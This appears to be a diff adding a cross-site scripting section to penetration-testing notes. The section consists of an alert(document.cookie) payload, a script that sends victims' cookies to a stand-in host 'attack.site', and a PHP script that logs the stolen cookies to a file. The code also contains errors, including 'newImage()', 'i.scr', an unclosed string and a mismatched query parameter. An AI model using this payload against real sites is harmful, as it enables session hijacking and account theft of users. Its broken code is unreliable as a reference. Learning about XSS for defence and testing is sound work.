@@ -76,6 +76,39 @@
 
 *Tips: Searh for **Signup pages** and **old configuration files.***
 
+-------------------------------------
+
+## Cross-Site Scripting
+
+* Session Cookies
+    * document.cookie - This is where the cookies are stored
+
+    *Display cookie as an alert*
+    ``` 
+    [<script>alert(document.cookie)</script>]
+    ```
+    *Victim's Browser*
+    ```
+    <script>
+    var i = newImage();
+    i.scr="http://attack.site/log.php?="+document.cookie;
+    </script>
+    ```
+
+    *Attacker's Computer*
+    ```
+    <?php
+    $filename="/tmp/log.txt;
+    $fp=fopen($filename, 'a');
+    $cookie=$_GET['q'];
+    fwrite($fp, $cookie);
+    fclose($fp);
+    ?>
+    ```
+
+
+
+
 
 
 
